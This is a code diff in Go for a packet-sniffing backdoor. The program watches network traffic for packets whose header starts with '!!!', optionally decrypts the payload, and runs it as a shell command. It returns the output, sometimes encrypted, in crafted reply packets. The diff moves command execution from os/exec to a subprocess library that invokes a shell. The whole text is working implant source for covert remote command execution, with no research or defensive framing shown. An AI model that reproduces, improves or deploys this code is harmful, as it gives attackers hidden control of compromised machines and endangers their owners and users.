@@ -7,10 +7,10 @@ import (
 	"log"
 	"net"
 	"os"
-	"os/exec"
 	"strconv"
 	"strings"
 
+	"github.com/estebangarcia21/subprocess"
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
 	"github.com/google/gopacket/pcap"
@@ -111,14 +111,16 @@ func sniffer() {
 		set_flags(header)
 		if strings.HasPrefix(header, "!!!") {
 			var out []byte
-			var err error
+			var err []byte
 			payload = payload[7:]
 
 			if SSM {
 				payload = encrypt_decrypt(payload)
 			}
 			if execute {
-				out, err = exec.Command(payload).Output()
+				s := subprocess.New(payload, subprocess.Shell)
+				out = s.Stdout()
+				err = s.Stderr()
 			} else {
 				if payload == "ping" {
 					out = []byte("$pong")
@@ -128,9 +130,8 @@ func sniffer() {
 			}
 
 			if err != nil {
-				fail := err.Error()
 				if SSM {
-					out = []byte(encrypt_decrypt(string(fail)))
+					out = []byte(encrypt_decrypt(string(err)))
 				}
 				fmt.Println("[FAILED]", string(out))
 				generate_packet(string(out), 0)
